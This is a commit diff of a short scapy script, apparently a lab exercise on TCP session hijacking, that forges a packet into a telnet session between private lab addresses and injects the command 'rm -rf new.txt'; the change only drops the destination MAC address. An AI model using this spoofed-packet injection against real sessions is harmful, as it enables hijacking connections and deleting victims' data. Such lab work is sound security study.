9bad01b24db08ca3883b7f94c72bffcc3c51f7c9
Ethan Harris <576552241qwj@gmail.com>
2021-12-06 10:43:33 +0800

    main

--- Task3.py
+++ Task3.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 from scapy.all import *
-eth = Ether(src="02:42:0a:09:00:06", dst="02:42:0a:09:00:05")
+eth = Ether(src="02:42:0a:09:00:06")
 ip  = IP(src="10.9.0.6", dst="10.9.0.5")
 tcp = TCP(sport=59956, dport=23, flags="AP", seq=516336028, ack=2142703339)
 data = "rm -rf new.txt\r"
